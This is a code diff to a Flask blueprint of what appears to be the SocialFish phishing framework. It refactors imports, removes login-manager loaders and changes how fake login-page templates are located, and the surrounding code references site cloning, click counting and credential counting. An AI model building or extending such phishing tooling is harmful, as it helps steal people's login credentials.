@@ -1,12 +1,10 @@
-from flask import Flask, request, render_template, jsonify, redirect, g, flash, Blueprint, current_app
+from flask import Flask, request, render_template, jsonify, redirect, g, flash, Blueprint, current_app, url_for
 from .core.view import head
 from .core.scansf import nScan
 from .core.clonesf import clone
-from .core.dbsf import initDB
 from .core.genToken import genToken, genQRCode
 from .core.sendMail import sendMail
 from .core.tracegeoIp import tracegeoIp
-from .core.cleanFake import cleanFake
 from .core.genReport import genReport
 from .core.report import generate_unique #>> new line
 from datetime import date
@@ -54,32 +52,6 @@ def countNotPickedUp():
     count = count - countCreds()
     return count
 
-#----------------------------------------
-
-# definicoes de login
-@login_manager.user_loader
-def user_loader(email):
-    if email not in users:
-        return
-
-    user = User()
-    user.id = email
-    return user
-
-
-@login_manager.request_loader
-def request_loader(request):
-    email = request.form.get('email')
-    if email not in users:
-        return
-
-    user = User()
-    user.id = email
-    user.is_authenticated = request.form['password'] == users[email]['password']
-
-    return user
-
-# ---------------------------------------------------------------------------------------
 
 # Rota para o caminho de inicializacao, onde e possivel fazer login
 @socialbp.route('/neptune', methods=['GET', 'POST'])
@@ -123,7 +95,7 @@ def getLogin():
         cur = g.db
         cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
         g.db.commit()
-        template_path = 'fake/{}/{}/index.html'.format(agent, o)
+        template_path = os.path.join('fake', agent, o, 'index.html')
         return render_template(template_path)
     # caso seja a url padrao
     elif url == 'https://github.com/UndeadSec/SocialFish':
